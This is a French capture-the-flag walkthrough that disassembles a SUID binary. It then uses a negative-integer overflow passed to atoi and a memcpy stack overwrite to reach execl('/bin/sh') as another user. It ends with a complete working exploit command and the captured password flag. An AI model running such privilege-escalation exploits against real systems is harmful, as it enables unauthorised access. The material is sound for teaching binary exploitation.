## Analyse
- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
  [...]
  ```
  - On a un binaire appartenant a bonus2 dans le home avec les droits SUID.

- `./bonus1`
  ```
  Segmentation fault (core dumped)
  ```
  - Le programme segfault sans arguments

- `./bonus1 test`
  ```
  ```
  - Le programme se termine sans rien afficher

- `gdb bonus1`
  - `set disassembly-flavor intel`
  - `info function`
    ```
    [...]
      0x08048424  main
    [...]
    ```
    - On ne trouve rien d'autre que la fonction main

  - `disas main`
    ```asm
    Dump of assembler code for function main:
       0x08048424 <+0>:     push   ebp
       0x08048425 <+1>:     mov    ebp,esp
       0x08048427 <+3>:     and    esp,0xfffffff0
       0x0804842a <+6>:     sub    esp,0x40
       0x0804842d <+9>:     mov    eax,DWORD PTR [ebp+0xc]
       0x08048430 <+12>:    add    eax,0x4
       0x08048433 <+15>:    mov    eax,DWORD PTR [eax]
       0x08048435 <+17>:    mov    DWORD PTR [esp],eax
       0x08048438 <+20>:    call   0x8048360 <atoi@plt>
       0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax
       0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9
       0x08048446 <+34>:    jle    0x804844f <main+43>
       0x08048448 <+36>:    mov    eax,0x1
       0x0804844d <+41>:    jmp    0x80484a3 <main+127>
       0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]
       0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
       0x0804845a <+54>:    mov    eax,DWORD PTR [ebp+0xc]
       0x0804845d <+57>:    add    eax,0x8
       0x08048460 <+60>:    mov    eax,DWORD PTR [eax]
       0x08048462 <+62>:    mov    edx,eax
       0x08048464 <+64>:    lea    eax,[esp+0x14]
       0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx
       0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx
       0x08048470 <+76>:    mov    DWORD PTR [esp],eax
       0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
       0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
       0x08048480 <+92>:    jne    0x804849e <main+122>
       0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0
       0x0804848a <+102>:   mov    DWORD PTR [esp+0x4],0x8048580
       0x08048492 <+110>:   mov    DWORD PTR [esp],0x8048583
       0x08048499 <+117>:   call   0x8048350 <execl@plt>
       0x0804849e <+122>:   mov    eax,0x0
       0x080484a3 <+127>:   leave  
       0x080484a4 <+128>:   ret    
    End of assembler dump.
    ```

  - <+0> ... <+6>
    - Initialisation de la mémoire (libère 64 octets pour la stack), alignement de la stack<br/><br/>
  - <+9>...<+25>
    - Prépare les arguments pour l'appel de atoi
    - Stocke le pointeur de argv (ebp+0xc) dans eax
    - Ajoute 4 pour atteindre argv[1]
    - Transfert la valeur de argv[1] dans EAX
    - Transfert la valeur de argv[1] (EAX) dans ESP
    - Appel atoi avec argv[1] en argument
    - Stocke le retour dans esp+0x3c<br/><br/>
  - <+29>...<+34>
    - Compare le retour du atoi avec la valeur 9
    - Si la valeur est inferieur ou egale a 9 on jump a l'instruction <main+43><br/><br/>
  - <+36>...<+41>
    - Met la valeur 1 dans eax pour la préparation du return(1)
    - Jump à l'instruction <main+127><br/><br/>
  - <+43>...<+79>
    - Prepare les arguments pour l'appel de memcpy
    - Stocke le retour de atoi dans EAX
    - Multiplie le retour de atoi (EAX) par 4 et le stocke dans ECX
    - Stocke argv dans eax
    - Ajoute 8 a argv pour arriver sur argv[2]
    - Stocke la valeur argv[2] (EAX) dans EAX
    - Stocke argv[2] (EAX) dans EDX
    - Met la valeur d'un pointeur sur l'espace aloué au debut qui se situe a ESP+14.
      Qui fait que nous donnons un pointeur sur un char * d'une taille de 0x3c(retour de atoi)- 0x14 (adresse char*) = 40.
    - Stocke le retour d'atoi * 4 (ECX) en 3eme argument du memcpy
    - Stocke argv[2] (EDX) en 2eme argument du memcpy
    - Stocke le pointeur sur le char[40] en premier argument du memcpy
    - Appel memcpy(char[40], argv[2],  a*4)<br/><br/>
  - <+84>...<+92>
    - Compare le retour de atoi (ESP+0x3c) avec la valeur 1464814662
    - Si le retour du atoi n'est pas egale avec cette valeur jump a <main+122><br/><br/>
  - <+94>...<+117>
    - Prepare les arguments pour l'appel de execl
    - Stocke 0 en 3eme argument de execl qui est equivalent a NULL comme execl prends des char en argument
    - `x/10s 0x8048580`
      ```asm
      0x8048580:       "sh"
      0x8048583:       "/bin/sh"
      ```
    - Stocke "sh" en 2nd argument
    - Stocke "/bin/sh" en 1er argument
    - Appel execl("/bin/sh", "sh", NULL)<br/><br/>
  - <+122>...<+128>
    - Return 0
    - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
## Exploit

Après analyse, nous comprenons que pour obtenir notre flag il faut donner en input un nombre dont la valeur doit être inférieure ou égale à 9. Plus loin, cette valeur doit être égale a 0x574f4c46 (1464814662).

Nous voyons aussi que le memcpy() n'est pas protegé. En effet notre string b fait 40, et si notre argv[2] fait plus de 40 nous avons un SegFault. 

- `gdb bonus1`
  - `set disassembly-flavor intel`
  - `r -2 $(python -c 'print "A" * 44')`
    ```
    Program received signal SIGSEGV, Segmentation fault.
    0xb7f65ef5 in ?? () from /lib/i386-linux-gnu/libc.so.6
    ```
  - `info registers`
    ```
    (gdb) info registers
    eax            0xbfffff8a       -1073741942
    ecx            0xfffffddc       -548
    edx            0xbffffd80       -1073742464
    ebx            0xb7fd0ff4       -1208152076
    esp            0xbffffbc8       0xbffffbc8
    ebp            0xbffffc18       0xbffffc18
    esi            0x0      0
    edi            0x0      0
    eip            0xb7f65ef5       0xb7f65ef5
    eflags         0x210282 [ SF IF RF ID ]
    cs             0x73     115
    ss             0x7b     123
    ds             0x7b     123
    es             0x7b     123
    fs             0x0      0
    gs             0x33     51
    ```

b fait une taille de 40 et en écrivant 4 octets de plus, nous réécrivons a.
Pour avoir notre shell, notre a doit valoir 0x574f4c46 (1464814662), ca sera donc notre second argument:
```c
$(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

Maintenant le souci que nous avons est que la taille copiée par notre memcpy est de maximum 9 * 4 = 36 mais de notre côté nous voulons copier une taille de 44.

Un nombre negatif multiplié par 4 donne toujours un nombre negatif, cependant nous sommes en presence d'integer et nous avons :

**INT_MIN**  = -2147483647 - 1<br/>
**INT_MAX** = 2147483647

La raison de cette difference est la présence d'un bit de signe et nous pouvons abuser de cette particularité pour effectuer un [integer overflow](https://fr.wikipedia.org/wiki/D%C3%A9passement_d%27entier) afin avoir une valeur supérieure à 9.

Nous utilisons donc [le code python suivant](https://stackoverflow.com/questions/47100105/forcing-integer-overflow-in-python) pour forcer le cast en int et trouver la valeur avec laquelle nous obtenons un integer overflow pour avoir la valeur 44.
```python
>>> print((-2147483637*4) % 2**32)
44
```

- `./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')`
  ```
  ```
  - `whoami`
    ```
    bonus2
    ```
  - `cat /home/user/bonus2/.pass`
    ```
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
    ```
